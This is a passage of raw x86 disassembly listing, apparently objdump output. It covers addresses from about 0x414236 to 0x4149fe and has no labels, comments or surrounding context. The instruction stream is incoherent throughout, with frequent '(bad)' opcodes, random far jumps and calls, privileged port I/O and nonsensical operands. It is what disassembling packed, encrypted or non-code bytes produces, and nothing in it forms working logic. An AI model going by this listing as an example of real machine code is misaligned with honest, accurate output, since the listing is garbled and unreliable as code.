  414236:	fcmovu st,st(3)
  414238:	cs (bad) 
  41423a:	and    eax,0x1bbfcc1c
  41423f:	push   edi
  414240:	cdq    
  414241:	test   BYTE PTR [edi+0x18],bl
  414244:	or     ebp,esp
  414246:	loopne 0x4142a2
  414248:	or     eax,0x16e9d1dd
  41424d:	sbb    eax,0xceccf757
  414252:	mov    WORD PTR ds:0x748c7393,cs
  414258:	push   esi
  414259:	repnz call 0x768a:0xdf977128
  414261:	pop    edi
  414262:	in     al,0x6e
  414264:	xchg   esi,eax
  414265:	clc    
  414266:	inc    edi
  414267:	dec    esp
  414268:	fstp   TBYTE PTR [esi]
  41426a:	mov    BYTE PTR es:[edi+ebp*2],al
  41426e:	jo     0x414284
  414270:	int3   
  414271:	jge    0x41421a
  414273:	mov    bl,0xd2
  414275:	cmp    DWORD PTR [eax+0x69],ebp
  414278:	gs xor al,0x56
  41427b:	popa   
  41427c:	push   eax
  41427d:	cmp    edx,DWORD PTR [eax+0x72]
  414280:	pop    ss
  414281:	mov    ds:0x9d56282d,eax
  414286:	mov    ch,0xc1
  414288:	adc    al,BYTE PTR [ebx]
  41428a:	mov    ch,0x83
  41428c:	js     0x414290
  41428e:	shl    edi,cl
  414290:	add    eax,0x27ce7879
  414295:	pop    ss
  414296:	xor    BYTE PTR [edi],dh
  414298:	push   ecx
  414299:	jae    0x414294
  41429b:	add    DWORD PTR [ebp-0x1f],ecx
  41429e:	sbb    esi,eax
  4142a0:	add    eax,0xb231b807
  4142a5:	mov    dh,0x89
  4142a7:	mov    dh,0x4c
  4142a9:	pop    eax
  4142aa:	in     al,0x5d
  4142ac:	ins    BYTE PTR es:[edi],dx
  4142ad:	(bad)  
  4142ae:	in     eax,dx
  4142af:	(bad)
  4142b2:	inc    ecx
  4142b3:	pusha  
  4142b4:	clc    
  4142b5:	adc    eax,0xf9b2da4c
  4142ba:	mov    DWORD PTR [edx+esi*1+0x5fdd3de6],edx
  4142c1:	jne    0x4142d4
  4142c3:	dec    eax
  4142c4:	adc    al,0xf0
  4142c6:	xchg   esi,eax
  4142c7:	xchg   BYTE PTR [edx-0x58a2af4b],bl
  4142cd:	repz fsub QWORD PTR [edx+0x20bfa0d1]
  4142d4:	aam    0xdb
  4142d6:	ror    ch,0xa8
  4142d9:	fild   WORD PTR [esi-0x7adedd3f]
  4142df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142e0:	std    
  4142e1:	push   0xffffff99
  4142e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e4:	(bad)  
  4142e5:	ds push 0x7c
  4142e8:	xchg   ecx,eax
  4142e9:	pop    esi
  4142ea:	ins    BYTE PTR es:[edi],dx
  4142eb:	ret    0x8895
  4142ee:	and    eax,0x127919d6
  4142f3:	lock mov ch,0x8b
  4142f6:	cdq    
  4142f7:	xor    eax,0x6e72becb
  4142fc:	dec    esp
  4142fd:	pop    ecx
  4142fe:	cmp    bl,BYTE PTR [ebp+ecx*1-0x22]
  414302:	jnp    0x41436e
  414304:	push   0x22
  414306:	xor    BYTE PTR [edx],al
  414308:	xchg   DWORD PTR [eax+0x57a84e9c],ebp
  41430e:	repnz inc edi
  414310:	jmp    0x4142ed
  414312:	shl    DWORD PTR [edx+0x1b],1
  414315:	xchg   edi,eax
  414316:	mov    ch,0x94
  414318:	xchg   edx,eax
  414319:	jo     0x41435d
  41431b:	xor    al,0xcb
  41431d:	fwait
  41431e:	or     dh,BYTE PTR [eax-0x58]
  414321:	dec    edi
  414322:	or     DWORD PTR [esi+0x30],esi
  414325:	jnp    0x414341
  414327:	dec    edx
  414328:	cwde   
  414329:	jb     0x4142c2
  41432b:	push   esp
  41432c:	jnp    0x4143aa
  41432e:	outs   dx,DWORD PTR ds:[esi]
  41432f:	cmp    cl,dh
  414331:	or     eax,0x74e150b0
  414336:	mov    ds:0xd9711c96,al
  41433b:	pop    ecx
  41433c:	dec    ebp
  41433d:	push   edx
  41433e:	lahf   
  41433f:	fsubp  st(6),st
  414341:	rol    BYTE PTR [ebp-0x250d210],cl
  414347:	and    BYTE PTR [ecx-0x76],dh
  41434a:	aaa    
  41434b:	jle    0x414361
  41434d:	ficomp DWORD PTR [edi+0x3f]
  414350:	lock jmp 0x5d09754b
  414356:	bound  ecx,QWORD PTR [edi-0x2f7b6ff6]
  41435c:	adc    esp,ebp
  41435e:	cmp    DWORD PTR [ebx],edi
  414360:	xchg   esp,eax
  414361:	mov    ds:0xc592194f,eax
  414366:	and    esi,DWORD PTR [ecx]
  414368:	mov    ebp,0xdc0dd57b
  41436d:	xchg   edi,eax
  41436e:	cmp    BYTE PTR [ecx],ch
  414370:	mov    bl,0x1a
  414372:	pop    esp
  414373:	sub    al,0x76
  414375:	sub    dh,BYTE PTR [esi-0xe]
  414378:	out    dx,al
  414379:	mov    ecx,0xa5c4e60a
  41437e:	add    al,0xc7
  414380:	sbb    eax,0x7f0f418f
  414385:	lahf   
  414386:	jbe    0x4143e6
  414388:	arpl   WORD PTR [edx+ebp*2+0x3c7a8b07],sp
  41438f:	jg     0x4143c8
  414391:	dec    ebp
  414392:	add    BYTE PTR [ebx],dl
  414394:	ja     0x414415
  414396:	popa   
  414397:	out    dx,eax
  414398:	loopne 0x4143e1
  41439a:	jbe    0x414417
  41439c:	leave  
  41439d:	pop    es
  41439e:	jmp    0x8be63f76
  4143a3:	loope  0x414412
  4143a5:	jae    0x41438f
  4143a7:	clc    
  4143a8:	dec    esp
  4143a9:	and    esp,DWORD PTR [esi+0x4b]
  4143ac:	xchg   BYTE PTR [esi+0x2d],al
  4143af:	cld    
  4143b0:	add    al,0xd5
  4143b2:	ins    DWORD PTR es:[edi],dx
  4143b3:	and    BYTE PTR [ecx+0x5],ch
  4143b6:	inc    ebp
  4143b7:	xchg   esi,eax
  4143b8:	and    al,0xb3
  4143ba:	mov    DWORD PTR [eax+0x502fc77f],ebx
  4143c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143c1:	push   ebx
  4143c2:	jno    0x4143d2
  4143c4:	mov    bl,0x68
  4143c6:	and    ebp,edi
  4143c8:	idiv   BYTE PTR [eax+0x15a311e3]
  4143ce:	jo     0x4143a4
  4143d0:	popf   
  4143d1:	into   
  4143d2:	jl     0x414385
  4143d4:	adc    DWORD PTR [edx+0x3775885],eax
  4143da:	push   ss
  4143db:	scas   al,BYTE PTR es:[edi]
  4143dc:	mov    ch,BYTE PTR [edx-0x5f]
  4143df:	outs   dx,BYTE PTR ds:[esi]
  4143e0:	xchg   BYTE PTR [edi+edx*2],al
  4143e3:	in     al,0xc6
  4143e5:	add    eax,0x970bda6b
  4143ea:	ins    BYTE PTR es:[edi],dx
  4143eb:	xor    BYTE PTR ds:0x7ac65602,0x68
  4143f2:	call   0x5f22:0x88f84489
  4143f9:	or     BYTE PTR [eax],bl
  4143fb:	dec    ebx
  4143fc:	imul   esi,DWORD PTR [ebp-0x5a299aa1],0xffffffae
  414403:	rol    dh,1
  414405:	ss cs js 0x414450
  414409:	jp     0x4143ea
  41440b:	mov    ebx,0x6a210d54
  414410:	push   ebp
  414411:	iret   
  414412:	test   DWORD PTR [esi],ecx
  414414:	xchg   ecx,eax
  414415:	dec    esp
  414416:	mov    ah,0xff
  414418:	jecxz  0x41443f
  41441a:	out    dx,al
  41441b:	xor    BYTE PTR [eax+esi*8],dl
  41441e:	pop    ds
  41441f:	jl     0x4143f4
  414421:	js     0x4143fd
  414423:	pop    edi
  414424:	lods   al,BYTE PTR ds:[esi]
  414425:	sub    DWORD PTR gs:[ebx+0x2a5cb1ca],ebx
  41442c:	sub    DWORD PTR [edx+0x3d],esp
  41442f:	js     0x4143c2
  414431:	push   ecx
  414432:	pop    ebx
  414433:	repz dec esi
  414435:	lods   al,BYTE PTR ds:[esi]
  414436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414437:	pop    edx
  414438:	sbb    DWORD PTR [edx+0x243fcb41],0x3848ca58
  414442:	xor    DWORD PTR [ecx-0x24],edx
  414445:	cmp    al,0x9a
  414447:	jmp    0xbfcc:0xe07f254a
  41444e:	xchg   edx,eax
  41444f:	dec    eax
  414450:	cmp    BYTE PTR [ebx-0x26],0x6f
  414454:	aas    
  414455:	push   edx
  414456:	cmp    cl,0xbf
  414459:	sbb    eax,0xdcbf9a3d
  41445e:	jle    0x4144b3
  414460:	(bad)  
  414461:	je     0x4144a4
  414463:	ins    DWORD PTR es:[edi],dx
  414464:	xor    ebx,DWORD PTR [edx]
  414466:	sub    DWORD PTR [ecx+ecx*4],0xc34ab62f
  41446d:	sbb    dl,dh
  41446f:	mov    dh,0xd
  414471:	push   0x7c
  414473:	push   eax
  414474:	test   BYTE PTR [esi],0x90
  414477:	xor    eax,0x9cf14d9b
  41447c:	and    BYTE PTR [ecx-0x17],ah
  41447f:	push   0x4f
  414481:	repnz fild QWORD PTR [edx]
  414484:	mov    BYTE PTR [ecx],bh
  414486:	gs adc dh,0xc7
  41448a:	add    al,0xfc
  41448c:	aas    
  41448d:	in     al,dx
  41448e:	pop    eax
  41448f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414490:	xor    esp,DWORD PTR [esi+0x5ecfaeb6]
  414496:	pushf  
  414497:	and    BYTE PTR [eax+0x7b],ch
  41449a:	adc    DWORD PTR [edi-0x62],0x4ee4990
  4144a1:	out    dx,eax
  4144a2:	mov    ebp,0x26aa63f2
  4144a7:	and    DWORD PTR [eax+0x657ee649],ebx
  4144ad:	in     al,dx
  4144ae:	(bad)  
  4144af:	add    al,0x29
  4144b1:	mov    ch,ah
  4144b3:	or     dh,al
  4144b5:	aaa    
  4144b6:	mov    eax,0x7d33fdb4
  4144bb:	adc    BYTE PTR [edi-0x42a21307],ah
  4144c1:	int3   
  4144c2:	dec    BYTE PTR [esi-0x753983d3]
  4144c8:	jmp    0xd588:0xa6f0069
  4144cf:	cmp    al,0x6f
  4144d1:	ss call 0xbbdc0e7
  4144d7:	mov    bh,0x24
  4144d9:	mov    esp,0x61f4287a
  4144de:	shl    BYTE PTR [ecx-0x2f],cl
  4144e1:	xchg   edi,eax
  4144e2:	imul   ecx,DWORD PTR [edi],0x4798d3d6
  4144e8:	icebp  
  4144e9:	sub    edi,DWORD PTR [edi-0x14c23ac5]
  4144ef:	pop    ebp
  4144f0:	in     eax,dx
  4144f1:	int    0x18
  4144f3:	mov    eax,0x4a1c0d20
  4144f8:	add    eax,0x995b80ca
  4144fd:	pop    ds
  4144fe:	(bad)  
  4144ff:	sbb    ebx,ebx
  414501:	jecxz  0x414534
  414503:	sbb    al,0xf9
  414505:	jecxz  0x4144c4
  414507:	sti    
  414508:	dec    eax
  414509:	mov    ecx,0x9fb52f37
  41450e:	ss jp  0x4144f9
  414511:	sbb    DWORD PTR [ebx-0x263f3a1f],0x10
  414518:	inc    ebx
  414519:	mov    al,0x74
  41451b:	push   cs
  41451c:	mov    DWORD PTR es:[ecx+0x7ca3f6aa],eax
  414523:	leave  
  414524:	cwde   
  414525:	jnp    0x41456a
  414527:	seto   dh
  41452a:	cld    
  41452b:	xchg   esp,eax
  41452c:	dec    ecx
  41452d:	lock sub edi,ecx
  414530:	hlt    
  414531:	fsubr  st(6),st
  414533:	lahf   
  414534:	int    0x4d
  414536:	aam    0x55
  414538:	icebp  
  414539:	sub    DWORD PTR [edx+0x59],ecx
  41453c:	icebp  
  41453d:	js     0x41450e
  41453f:	fsub   st,st(7)
  414541:	add    BYTE PTR [esp+eax*2-0x1deea72f],al
  414548:	retf   
  414549:	xor    BYTE PTR [eax-0xc],0x5e
  41454d:	xchg   edx,eax
  41454e:	fiadd  DWORD PTR [eax+0x7f906af]
  414554:	mov    esp,0xc59ff5c3
  414559:	call   0x41b2ef15
  41455e:	ins    BYTE PTR es:[edi],dx
  41455f:	sub    esp,0x15c1ae29
  414565:	sub    esp,DWORD PTR [esi]
  414567:	jp     0x414557
  414569:	xchg   esi,eax
  41456a:	sbb    eax,DWORD PTR [edi+0x71abcc01]
  414570:	pop    es
  414571:	inc    edi
  414572:	out    dx,al
  414573:	ret    0x284e
  414576:	int3   
  414577:	sar    bh,1
  414579:	jl     0x4145cc
  41457b:	push   es
  41457c:	icebp  
  41457d:	inc    ecx
  41457e:	call   0xdf10c3f2
  414583:	add    BYTE PTR [edx],ch
  414585:	das    
  414586:	test   al,0x5e
  414588:	cmc    
  414589:	jns    0x414570
  41458b:	add    eax,eax
  41458d:	sbb    DWORD PTR [eax-0x2dd594ab],ebx
  414593:	rol    DWORD PTR [esi+0x59],0x45
  414597:	int    0xca
  414599:	iret   
  41459a:	jle    0x414527
  41459c:	adc    eax,0x7cdd5429
  4145a1:	loopne 0x41460e
  4145a3:	or     dl,bl
  4145a5:	gs pop es
  4145a7:	push   0xb0c37c60
  4145ac:	fst    DWORD PTR [edx+0x65]
  4145af:	mov    dh,BYTE PTR [edx]
  4145b1:	cmp    BYTE PTR [eax-0xf],dl
  4145b4:	jl     0x4145c5
  4145b6:	sub    al,0xba
  4145b8:	shr    DWORD PTR [bp+si-0x25e9],1
  4145bd:	sub    ebp,DWORD PTR [eax]
  4145bf:	fimul  DWORD PTR [esi]
  4145c1:	mov    ebx,0x910b04b
  4145c6:	mov    ebp,0xfdf84bf8
  4145cb:	jp     0x414639
  4145cd:	rcl    ebp,cl
  4145cf:	mov    al,ds:0x8534cc59
  4145d4:	retf   0xf6a
  4145d7:	mov    eax,0x9eb37313
  4145dc:	push   edx
  4145dd:	outs   dx,DWORD PTR ds:[esi]
  4145de:	push   ebx
  4145df:	es das 
  4145e1:	xchg   ebx,eax
  4145e2:	cmp    al,0xf4
  4145e4:	jo     0x414624
  4145e6:	ins    DWORD PTR es:[edi],dx
  4145e7:	sar    DWORD PTR [edi+0x5],cl
  4145ea:	in     al,dx
  4145eb:	xor    ch,BYTE PTR [ebx-0x2]
  4145ee:	mov    ds:0x985656aa,eax
  4145f3:	push   eax
  4145f4:	mov    ebx,0x6e1e0466
  4145f9:	aaa    
  4145fa:	mov    cl,bl
  4145fc:	rcr    BYTE PTR ds:0x6c24b7ca,1
  414602:	unpcklps xmm2,xmm2
  414605:	fmulp  st(2),st
  414607:	adc    DWORD PTR [eax],ebx
  414609:	add    DWORD PTR [esp+edi*8-0x33],eax
  41460d:	rcl    BYTE PTR [esi-0x25e24eb4],0x3a
  414614:	adc    edx,DWORD PTR [ebp+0x4841bdf7]
  41461a:	call   0x8cf2:0x7e611eec
  414621:	push   es
  414622:	jmp    0xd8d38030
  414627:	test   BYTE PTR [edx+ebp*1-0x36],ah
  41462b:	(bad)  
  41462c:	jmp    0x8b14:0x337f675f
  414633:	repz push ecx
  414635:	pop    ebx
  414636:	scas   eax,DWORD PTR es:[edi]
  414637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414638:	js     0x4145e9
  41463a:	loope  0x41460d
  41463c:	dec    ecx
  41463d:	dec    eax
  41463e:	sahf   
  41463f:	rol    DWORD PTR [edx],0x59
  414642:	enter  0xafb,0x31
  414646:	sahf   
  414647:	push   ds
  414648:	ror    DWORD PTR [esi+0x1a],cl
  41464b:	inc    ebx
  41464c:	push   ebp
  41464d:	outs   dx,DWORD PTR ds:[esi]
  41464e:	rcl    al,cl
  414650:	and    al,0xb1
  414652:	pop    ebp
  414653:	clc    
  414654:	cli    
  414655:	aaa    
  414656:	inc    esi
  414657:	cmp    cl,BYTE PTR [edx]
  414659:	and    al,0xa3
  41465b:	mov    esp,0x1e493ed3
  414660:	pushf  
  414661:	inc    esp
  414662:	sbb    DWORD PTR [edx+edi*4-0x2b],edx
  414666:	stos   DWORD PTR es:[edi],eax
  414667:	mov    WORD PTR [ebx+ebx*8],?
  41466a:	mov    edx,0xbf308089
  41466f:	dec    ebp
  414670:	rcl    DWORD PTR [ecx],1
  414672:	push   ds
  414673:	fldenv [eax+0x15b14513]
  414679:	int    0x4e
  41467b:	jl     0x41465c
  41467d:	stos   BYTE PTR es:[edi],al
  41467e:	(bad)  
  41467f:	adc    BYTE PTR [ebx-0x44],ah
  414682:	xor    al,ch
  414684:	(bad)  
  414685:	push   ebx
  414686:	pop    edx
  414687:	mov    dh,0xd6
  414689:	pop    ebp
  41468a:	add    bl,BYTE PTR [edx]
  41468c:	daa    
  41468d:	cmc    
  41468e:	test   al,0x31
  414690:	and    DWORD PTR [ebp+0x7c],edi
  414693:	or     dl,BYTE PTR [ecx+0x3f8371b0]
  414699:	(bad)  
  41469a:	jmp    0x41470e
  41469c:	or     al,BYTE PTR [ecx-0x25]
  41469f:	rcr    ebp,0x1
  4146a2:	pop    esp
  4146a3:	sub    BYTE PTR [eax-0x28],ah
  4146a6:	ret    
  4146a7:	push   edi
  4146a8:	ret    0xe4a7
  4146ab:	push   eax
  4146ac:	leave  
  4146ad:	adc    cl,bl
  4146af:	iret   
  4146b0:	add    eax,0x4cd6965e
  4146b5:	jp     0x414705
  4146b7:	jmp    FWORD PTR [ecx+eiz*8+0x36f0ff0]
  4146be:	sbb    ch,BYTE PTR [bx+si+0x26b8]
  4146c3:	jne    0x4146c9
  4146c5:	push   esi
  4146c6:	int    0x81
  4146c8:	sbb    al,0x5d
  4146ca:	mov    edx,0xdd182644
  4146cf:	jle    0x414691
  4146d1:	jmp    0xb54c:0xf620a40
  4146d8:	mov    ah,0xf7
  4146da:	fadd   QWORD PTR [edx]
  4146dc:	jb     0x414681
  4146de:	mov    dl,0x56
  4146e0:	sbb    bl,bh
  4146e2:	aam    0x23
  4146e4:	aas    
  4146e5:	popa   
  4146e6:	xchg   edx,eax
  4146e7:	(bad)  
  4146e8:	jl     0x414742
  4146ea:	cli    
  4146eb:	lahf   
  4146ec:	test   al,0x75
  4146ee:	lds    edx,FWORD PTR [edi+0x36]
  4146f1:	pop    esp
  4146f2:	or     DWORD PTR [esi-0x7d],esp
  4146f5:	aad    0x86
  4146f7:	das    
  4146f8:	xchg   ecx,eax
  4146f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146fa:	and    al,0xa6
  4146fc:	jmp    0x41476e
  4146fe:	mov    eax,0x90b75028
  414703:	fcomip st,st(5)
  414705:	adc    ecx,edx
  414707:	xchg   ecx,eax
  414708:	add    BYTE PTR [edx-0x18bde48],dl
  41470e:	leave  
  41470f:	sbb    edx,DWORD PTR [esi+0x3f]
  414712:	sub    ah,BYTE PTR [edx]
  414714:	shr    bl,0x3c
  414717:	dec    ebx
  414718:	adc    ebx,esp
  41471a:	and    ch,BYTE PTR [ecx+0x6c]
  41471d:	dec    edx
  41471e:	in     eax,0x5a
  414720:	mov    ebp,0x3a581c35
  414725:	nop
  414726:	adc    DWORD PTR [eax+ebp*8-0x5],esi
  41472a:	fsub   QWORD PTR [ebx-0x285f1ad4]
  414730:	imul   edi,ebx,0xffffffa6
  414733:	ins    BYTE PTR es:[edi],dx
  414734:	push   esp
  414735:	aaa    
  414736:	and    ecx,DWORD PTR [ecx+0x6e]
  414739:	test   DWORD PTR [eax-0x5551380f],ebp
  41473f:	xor    DWORD PTR [edx],0x3b30dc2d
  414745:	loop   0x4147a3
  414747:	jmp    DWORD PTR [edi+edi*1+0x7c440aaa]
  41474e:	ins    DWORD PTR es:[edi],dx
  41474f:	mov    eax,0x6d82a02a
  414755:	jno    0x4147b2
  414757:	gs pop ss
  414759:	in     eax,0x85
  41475b:	aaa    
  41475c:	and    al,0x82
  41475e:	ret    
  41475f:	sbb    BYTE PTR [eax-0x5a],cl
  414762:	aas    
  414763:	mov    ds:0xcf221e0a,eax
  414768:	int    0x8c
  41476a:	clc    
  41476b:	sub    ah,BYTE PTR [ecx+edx*4-0x78]
  41476f:	push   ds
  414770:	add    al,0x57
  414772:	cs xor al,0x6c
  414775:	cmp    BYTE PTR [eax+0x6ee40598],0x79
  41477c:	xor    eax,0x32661fc4
  414781:	cmp    DWORD PTR [eax-0x2a],0xa
  414785:	and    ebp,DWORD PTR [esi+0x44da676c]
  41478b:	xchg   esp,eax
  41478c:	aaa    
  41478d:	ins    BYTE PTR es:[edi],dx
  41478e:	fsubr  QWORD PTR [edx]
  414790:	iret   
  414791:	std    
  414792:	mov    eax,ds:0x16bd64e2
  414797:	sub    edi,DWORD PTR [edi]
  414799:	add    BYTE PTR [edi+ecx*8],ah
  41479c:	shl    BYTE PTR [esi],1
  41479e:	mov    edi,0x9d1e6e53
  4147a3:	mov    ah,0x86
  4147a5:	mov    ds:0x7d55e8e9,al
  4147aa:	sbb    al,0x2d
  4147ac:	iret   
  4147ad:	mov    ah,0xe9
  4147af:	test   al,0xb3
  4147b1:	shl    ch,1
  4147b3:	repz test bh,ch
  4147b6:	push   es
  4147b7:	cmp    bh,BYTE PTR [ecx]
  4147b9:	(bad)  
  4147ba:	cmp    al,0xe2
  4147bc:	xchg   ecx,eax
  4147bd:	sahf   
  4147be:	repnz ss popa 
  4147c1:	cmp    edx,esi
  4147c3:	int3   
  4147c4:	inc    ebp
  4147c5:	lods   eax,DWORD PTR ds:[esi]
  4147c6:	dec    eax
  4147c7:	fcmovb st,st(7)
  4147c9:	dec    ebx
  4147ca:	mov    al,0xa4
  4147cc:	(bad)  
  4147cd:	pop    edi
  4147ce:	jecxz  0x4147db
  4147d0:	cmp    BYTE PTR [ecx+eax*8+0x18],cl
  4147d4:	jnp    0x4147fc
  4147d6:	add    BYTE PTR [eax-0x38],0x8
  4147da:	sub    eax,0x81dfc251
  4147df:	jmp    0xfeb6:0xdbd3f22d
  4147e6:	mov    bl,0xef
  4147e8:	rol    DWORD PTR [ecx-0x1b],0xcd
  4147ec:	pop    edx
  4147ed:	loope  0x4147e1
  4147ef:	dec    ecx
  4147f0:	iret   
  4147f1:	(bad)  
  4147f2:	rcr    DWORD PTR gs:[ebp+edx*4+0x78],cl
  4147f7:	add    BYTE PTR [ebp+0x4b9c5365],ch
  4147fd:	(bad)  
  4147fe:	loope  0x414782
  414800:	test   edx,ebp
  414802:	push   0xffffffca
  414804:	fistp  WORD PTR [eax-0x15ed0f9f]
  41480a:	pop    esi
  41480b:	mov    ch,0x50
  41480d:	push   0xc5509b5b
  414812:	test   al,0x75
  414814:	test   al,0xda
  414816:	in     eax,0x30
  414818:	or     DWORD PTR [esp+eax*8+0x76a9182d],esp
  41481f:	in     eax,0xa6
  414821:	rcr    edx,0x53
  414824:	dec    ebx
  414825:	mov    edx,0xdb00f5d9
  41482a:	test   al,0x50
  41482c:	fstp   TBYTE PTR [edx]
  41482e:	dec    ecx
  41482f:	or     ah,BYTE PTR [eax]
  414831:	adc    al,0xb6
  414833:	sub    ah,ch
  414835:	dec    esp
  414836:	mov    ch,0x46
  414838:	inc    ecx
  414839:	or     BYTE PTR [ebp+0x42],0x5c
  41483d:	out    dx,al
  41483e:	pop    ss
  41483f:	jne    0x414896
  414841:	dec    esi
  414842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414843:	inc    ebx
  414844:	mov    dl,0x84
  414846:	mov    ds:0xf17f08d7,eax
  41484b:	outs   dx,DWORD PTR ds:[esi]
  41484c:	cld    
  41484d:	dec    ecx
  41484e:	pop    ds
  41484f:	adc    esi,DWORD PTR [eax+0x20cb9f53]
  414855:	cmc    
  414856:	fdivr  DWORD PTR [ebx+0x54]
  414859:	adc    al,0x30
  41485b:	xchg   ebp,eax
  41485c:	imul   BYTE PTR [edx-0x2a3eaa63]
  414862:	xor    esi,esi
  414864:	xor    al,0xf0
  414867:	xchg   edi,eax
  414868:	inc    ecx
  414869:	fstp   DWORD PTR [esp+edi*2]
  41486c:	sbb    al,0xde
  41486e:	sub    eax,0xed9014a8
  414873:	xchg   ebp,eax
  414874:	aaa    
  414875:	(bad)  
  414876:	fimul  DWORD PTR [edi+0x5a0d5eb2]
  41487c:	ret    
  41487d:	push   fs
  41487f:	out    dx,eax
  414880:	lods   al,BYTE PTR ds:[esi]
  414881:	and    bl,0x8
  414884:	(bad)  [edx+0x49]
  414887:	push   ebp
  414888:	add    eax,0x9e9e579a
  41488d:	dec    edx
  41488e:	jnp    0x414859
  414890:	sbb    eax,0x9cd22ff3
  414895:	mov    ah,0xb0
  414897:	or     DWORD PTR [edx+0x6c2f9a13],ebx
  41489d:	xor    ebx,DWORD PTR [edi]
  41489f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148a1:	jp     0x41483f
  4148a3:	rcl    ecx,0x21
  4148a6:	cmp    DWORD PTR [ebp+0x7e],0xffffffb8
  4148aa:	int3   
  4148ab:	mov    BYTE PTR [ecx+0x13],bl
  4148ae:	mov    ecx,0x73d2a50e
  4148b3:	push   ds
  4148b4:	out    0x71,eax
  4148b6:	fs push esp
  4148b8:	in     al,0xab
  4148ba:	jmp    0x41483e
  4148bc:	sbb    DWORD PTR [edi],esi
  4148be:	cmovno edx,DWORD PTR [eax]
  4148c1:	jl     0x414938
  4148c3:	sub    dh,BYTE PTR [edi-0x7c]
  4148c6:	lea    esp,ds:0xea8600c2
  4148cc:	outs   dx,DWORD PTR ds:[esi]
  4148cd:	dec    edx
  4148ce:	stos   BYTE PTR es:[edi],al
  4148cf:	sub    al,0x73
  4148d1:	pop    ss
  4148d2:	pop    esp
  4148d3:	test   DWORD PTR [edi+0x27d44dfe],eax
  4148d9:	mov    edi,0x5a0117fc
  4148de:	idiv   BYTE PTR [ecx-0x18db25f0]
  4148e4:	inc    ebp
  4148e5:	mov    ebx,0xc22b0aa7
  4148ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148eb:	cmc    
  4148ec:	dec    eax
  4148ed:	push   eax
  4148ee:	fldenv [esi]
  4148f0:	push   ss
  4148f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148f2:	push   es
  4148f3:	mov    ch,0x75
  4148f5:	es repz inc dx
  4148f9:	jb     0x414901
  4148fb:	scas   eax,DWORD PTR es:[edi]
  4148fc:	jle    0x4148a8
  4148fe:	test   DWORD PTR [esi],edx
  414900:	inc    eax
  414901:	pop    esp
  414902:	test   al,0xa5
  414904:	out    0x95,al
  414906:	jns    0x414939
  414908:	loope  0x41490c
  41490a:	sbb    eax,0x6660572a
  41490f:	in     eax,0x43
  414911:	adc    dl,al
  414913:	add    edi,ebp
  414915:	in     eax,dx
  414916:	mov    ecx,0xa5b1267e
  41491b:	div    DWORD PTR [ebx+0x3ea76075]
  414921:	jne    0x414929
  414923:	push   ds
  414924:	inc    edx
  414925:	push   edi
  414926:	adc    BYTE PTR [ebx+ebx*8+0x26c0928e],0x11
  41492e:	sub    ch,BYTE PTR [eax]
  414930:	ror    BYTE PTR [edx],0x5e
  414933:	(bad)  
  414934:	test   BYTE PTR [edi],0x63
  414937:	fcmovnbe st,st(5)
  414939:	xor    al,0x45
  41493b:	xor    DWORD PTR [edx+edi*1],ebp
  41493e:	jle    0x4148cb
  414940:	out    0xbd,eax
  414942:	out    dx,al
  414943:	push   edx
  414944:	pop    ss
  414945:	pushf  
  414946:	int    0xe8
  414948:	dec    edx
  414949:	dec    edi
  41494a:	and    al,0x1
  41494c:	xchg   esi,eax
  41494d:	fisttp DWORD PTR [eax-0x6d]
  414950:	inc    ebx
  414951:	shl    BYTE PTR [edi],1
  414953:	and    eax,0xc0c3b00c
  414958:	fld    QWORD PTR [edi]
  41495a:	push   es
  41495b:	rcr    DWORD PTR [esi-0x3a363ec7],0x98
  414962:	pop    es
  414963:	ja     0x4148fa
  414965:	shl    BYTE PTR [ecx],cl
  414967:	adc    DWORD PTR [edx+0x36],0x4abc734c
  41496e:	sub    DWORD PTR [ebp+0x7c5557bb],eax
  414974:	pushf  
  414975:	cmp    BYTE PTR [esp+eax*2-0x7ed7ce4b],bh
  41497c:	je     0x4149d4
  41497e:	sub    al,0xf8
  414980:	in     al,dx
  414981:	call   DWORD PTR fs:[ecx+ebx*4-0x2ba69b41]
  414989:	xchg   DWORD PTR [eax+0x1d7a9c38],esi
  41498f:	outs   dx,DWORD PTR ds:[si]
  414991:	mov    dl,0x71
  414993:	pop    ecx
  414994:	jg     0x414973
  414996:	test   esi,esi
  414998:	mov    esi,0x118da298
  41499d:	daa    
  41499e:	test   ch,al
  4149a0:	sub    BYTE PTR [edi+0x7b],dl
  4149a3:	adc    eax,0x3a3793db
  4149a8:	mov    bl,0xc6
  4149aa:	mov    ah,0x8d
  4149ac:	je     0x414a01
  4149ae:	jmp    0x414960
  4149b0:	loop   0x4149d2
  4149b2:	pop    esp
  4149b3:	cdq    
  4149b4:	cmc    
  4149b5:	mov    cl,bl
  4149b7:	dec    esp
  4149b8:	mov    DWORD PTR [ebx],edi
  4149ba:	inc    edi
  4149bb:	xchg   edi,eax
  4149bc:	jp     0x414992
  4149be:	sub    ch,dl
  4149c0:	int    0xea
  4149c2:	inc    ecx
  4149c3:	jno    0x4149fa
  4149c5:	fnsave [edi+0x55b4830e]
  4149cb:	jmp    0x414999
  4149cd:	(bad)  
  4149ce:	cld    
  4149cf:	pop    esp
  4149d0:	fist   DWORD PTR [eax-0x1]
  4149d3:	cli    
  4149d4:	adc    edi,DWORD PTR [ebp+0x7a980a44]
  4149da:	mov    ebx,eax
  4149dc:	pusha  
  4149dd:	add    DWORD PTR [ecx],0xffffffac
  4149e0:	ret    
  4149e1:	cs ret 0x7825
  4149e5:	dec    eax
  4149e6:	aam    0xec
  4149e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149e9:	call   0x77e92abd
  4149ee:	push   eax
  4149ef:	call   DWORD PTR [ebp-0xef67479]
  4149f5:	pusha  
  4149f6:	fisttp QWORD PTR [edx+0x7f2fcfcb]
  4149fc:	or     DWORD PTR [ecx],ebp
  4149fe:	adc    ebp,DWORD PTR [ebp+0x3f397fb6]
